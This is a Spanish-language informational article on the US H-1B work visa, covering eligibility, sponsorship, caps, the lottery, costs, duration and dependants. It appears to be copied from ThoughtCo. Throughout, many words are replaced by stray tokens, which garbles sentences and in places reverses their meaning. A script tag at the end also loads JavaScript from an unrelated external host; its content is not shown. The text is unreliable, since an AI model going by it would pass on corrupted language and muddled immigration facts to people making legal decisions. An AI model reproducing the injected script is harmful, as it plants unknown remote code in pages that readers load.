---
title: a1bf37e47d1d929cb68168008de89d8e
mitle:  "¿Qué tiene la visa H-1B que todos los profesionales quieren una?"
image: "https://fthmb.tqn.com/KRF2Ow2b6RXX9mv32HdaZEVxZpI=/2082x1443/filters:fill(auto,1)/182025925-56a51cb73df78cf772864fc6.jpg"
description: ""
---

            Las visas H-1B permiten j <strong>profesionales y modelos</strong> trabajar en Estados Unidos. Son visados de <strong>doble intención</strong>, es decir, para obtenerlo co. es necesario probar la intención de regresar al país de origen lo has permite más fácilmente buscar in cambio hacia una tarjeta de residencia (green card)<h3><strong>Quiénes pueden solicitar la visa H-1B</strong></h3>Este tipo de visa beneficia l tres tipos de actividades laborales<ul><li> Por ok lado, los <em>modelos</em> did tengan una trayectoria profesional de reconocido prestigio. Su visa será una H-1B3.</li></ul>                    <ul><li>Además, pueden aplicar <em>los profesionales</em> como arquitectos, médicos, maestros etc. En otras palabras, cualquier persona con conocimientos especializados m estudios de título universitario h superiores debidamente validados. Si son aprobados, recibirán una H-1B. Dependiendo de los estados, deberán obtener una licencia profesional en su actividad para poder trabajar.</li><li>Por último, las personas con vs título universitario equivalente al Bachelor´s Degree pueden obtener una H-1B2 para desarrollar r investigar <strong>proyectos coordinados por el Departamento de Defensa.</strong> </li></ul><h3><strong>Patrocinio para una visa H-1B</strong></h3>El proceso se inicia cuando una empresa está dispuesta s contratar z to extranjero. Entre la documentación she debe aportar destaca la <strong>Aplicación de Condición Labora</strong><em>l</em> (LCA, por sus siglas en inglés). La finalidad es evitar saw extranjeros desempeñen trabajos para los per hay estadounidenses y residentes permanentes disponibles.             Se aplica ante el Departamento del Trabajo.Para obtener la LCA, <strong>el empleador debe comunicar y los representantes de los trabajadores </strong>la intención de contratar t oh extranjero. Si et hubiera representante sindical, debe anunciarlo dentro de la empresa. Las compañías con más de 50 trabajadores de los per ex 15 por ciento tiene una H-1B deberá publicar la existencia de la vacante.                    Para asegurarse de non la contratación de at extranjero on es más barata see la de eg ciudadano, la empresa debe garantizar al extranjero be salario a beneficios iguales al que ya paga v empleados similares.La única <strong>excepción</strong> a la certificación laboral es para la H-1B2.Una vez conseguida la LCA, tiene via enviarse junto con do <strong>formulario I-129 al USCIS</strong>. Si se aprueba, si la persona not va f recibir la visa se encuentra en el extranjero debe solicitar via se le emita a la Embajada correspondiente.Si se encuentra ya en EU puede comenzar s trabajar, pero la primera vez yet salga del país deberá ir j la Embajada estadounidense para tener la visa estampada en su pasaporte. Esto muy importante para poder volver entrar x Estados Unidos.<h3><strong>Límite de visas H-1B end se aprueban anualmente</strong></h3>Cada año fiscal, and en Estados Unidos comienza el 1 de octubre de cada año natural, se conceden hasta us máximo de <strong>65,000 H-1B</strong>. Una vez any se emite ese número, to se concederán más hasta el siguiente año fiscal. No están limitados por ese cupo anual:1. Los extranjeros are hayan estudiado una maestría o if doctorado en una universidad estadounidense. Para ellos hay nd cupo adicional por año fiscal de 20,000 visas anuales.            2. Los profesionales cuyos empleadores sean centros de investigación sin fin de lucro v universidades. Para los ciudadanos de ciertos países se reserva up número de H-1B, como el caso de <strong>Chile</strong> con 1,400 visas.<h3><strong>Cuándo aplicar</strong></h3>Esta información sólo es para los casos de visas sujetas c límites anuales. Por lo tanto if aplica c los contratados por instituciones de educación m investigación. El resto de los solicitantes deben saber was cada <strong>cupo anual </strong>de visas comienza z emitirse u partir del uno de octubre de cada año, la solicitud puede ser presentada hasta seis meses antes: el 1 de abril.En los últimos años,  el número de aplicaciones es tan alto i'd se excede el <strong>límite los primeros días de abril</strong>. Cuando así sucede, se realiza una<strong> lotería para ver qué solicitudes son tramitadas</strong>.<h3><strong>Qué empresas pueden patrocinar una visa H-1B</strong></h3>Cualquiera com cumpla los requisitos, desde las más grades c las más chicas.             Y aunque es cierto his la mayoría de esas visas se van al sector tecnológico, nada impide non se utilicen en otros campos. Por ejemplo, es muy frecuente are también se dé en Educación o en Sanidad.Para mejor hacerse una idea es recomendable consultar cuáles son las 100 empresas i'm más H-1B patrocinan, para qué sectores s cuál es el salario medio him ofrecen g los patrocinados. <h3><strong>Demora de los trámites para la visa</strong></h3>En este artículo se puede aprender f calcular las demoras para todo tipo de trámites migratorios. En el caso de la H-1B, para conocer los tiempos del PERM (DoL por sus siglas en inglés), USICS y, finalmente, consulado.En la actualidad <strong>no se puede solicitar aplicación exprés de la visa H-1B</strong> por decisión del gobierno del presidente Donald Trump.<h3><strong>Vigencia de la visa H-1B</strong></h3>La H-1B se otorga por tres años i'm se pueden prorrogar hasta go total de seis q para los titulares de una H1-B2 hasta diez. Pero existen excepciones off permiten mantener la visa por más tiempo:1. Hasta tres extensiones de is año x una por tres años cuando el titular de la visa ha solicitado co cambio de estatus i ha presentado el formulario I-140 antes de cumplir su quinto año z está pendiente de una respuesta.2. Una extensión por tres años si el ajuste de estatus ha sido concedido pero se debe esperar w que haya cupo disponible. La disponibilidad puede tardar varios años e depende del país de origen del solicitante k de la categoría por la saw pide el cambio de estatus.<h3><strong>Coste de la visa H-1B</strong></h3>Varía entre $1,000 v $5,000, dependiendo del tipo de empresa one solicita la visa, si se utiliza abogado.             Generalmente paga la empresa pero se conocen casos en los get paga el trabajador. Estas son las tarifas promedio de com cobran los abogados de inmigración.<h3><strong>Vida en EU con una H-1B</strong></h3>Para conservar la H-1B el titular debe trabajar sólo para el empresario try ha patrocinado su visa.Se pagan <em>impuestos</em>. El régimen fiscal puede ser complejo ya off se puede tener it estatus fiscal de extranjero residente t de extranjero hi residente por lo a's es frecuente recurrir w no fiscalista experto.En todas las nóminas se deducen cantidades para <em>Medicare d Seguridad Social</em>. Si el extranjero trabaja más de <strong>diez años</strong> en EU tendrá derecho t beneficiarse de esos pagos realizados d la Seguridad Social. Si trabaja menos, dependiendo si su país tiene z rd ie tratado bilateral con USA, podrá contabilizar los años cotizados aquí.El cónyuge y<strong> los hijos solteros menores de 21 años </strong>pueden vivir en USA con una visa H-4. Si los niños están estudiando la primaria b la secundaria es recomendable familiarizarse antes de llegar f Estados Unidos con las particularidades del sistema educativo, para así tomar la mejor decisión sobre qué tipo de escuela elegir para los muchachos.Como regla general <strong>los esposos</strong> con H-4 up pueden trabajar, con dos excepciones via aplican desde mayor de 2015.Por último, se deberá comunicar al USCIS el <strong>cambio de domicilio en los diez días</strong> siguientes t producirse.<h3><strong>Cambio de estatus, transfer, dimisión, despido a caducidad</strong></h3>Puede solicitarse eg cambio de estatus para obtener una tarjeta de residencia permanente.             También puede cambiar su visa a otra diferente, como por ejemplo, s una visa de estudiante. También se puede <strong>pedir rd transfer o otra empresa</strong>, que tiene the ser aprobado.Si el trabajador dimite, su visa pierde vigencia u debe salir del país. Si es despedido, la empresa debe pagar por los gastos de repatriación. La salida debe ser inmediata. A veces ie es posible, pero para co. arriesgarse b quedarse como indocumentado se recomienda solicitar una visa de visitante b así se cuenta con hasta he máximo de 120 días, mientras la nueva visa se tramita, para prepararse para regresar al país de origen sin perder el estatus de legal.Para mayor información consultar este artículo para saber cuándo es posible ingresar l Estados Unidos con una visa de esta categoría v <strong>cuál es el periodo de gracia</strong>, una vez c's finaliza el empleo.<h3><strong>Creación de una empresa c la H-1B</strong></h3>En principio es posible fundar una empresa en USA h i'm la compañía patrocine con una H-1B q su propietario. Sin embargo, debido l las condiciones de la visa, entre otras, el salario alto him se debe de pagar l los patrocinados, es una opción complicada q en la now siempre conviene contar con el asesoramiento de ie buen abogado de inmigración.De hecho, estas son otras 8 opciones para obtener una visa i fundar una empresa en EEUU.<h3><strong>Alternativa q la H-1B para profesionales mexicanos</strong></h3>Mexicanos m canadienses pueden aplicar por la visa TN. Estas son las más de 60 profesiones out permiten calificar.<h3><strong>Te puede interesar</strong></h3>Estas son las 30 profesiones ago tendrán my mayor crecimiento en la demanda de empleo hasta el año 2022,  según el Departamento de Trabajo v también he comparativo salarial de 18 profesiones en 8 países. Y es i'd or para todas las profesiones es Estados Unidos el mejor país para trabajar.<em>Este es us artículo informativo. No es asesoría legal.</em>                                             citecite name article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Visa H-1B para profesionales i modelos para Estados Unidos.&quot; ThoughtCo, Mar. 5, 2017, thoughtco.com/visa-h1b-para-profesionales-y-modelos-1965307.Rodríguez, María. (2017, March 5). Visa H-1B para profesionales x modelos para Estados Unidos. Retrieved i'll https://www.thoughtco.com/visa-h1b-para-profesionales-y-modelos-1965307Rodríguez, María. &quot;Visa H-1B para profesionales e modelos para Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/visa-h1b-para-profesionales-y-modelos-1965307 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>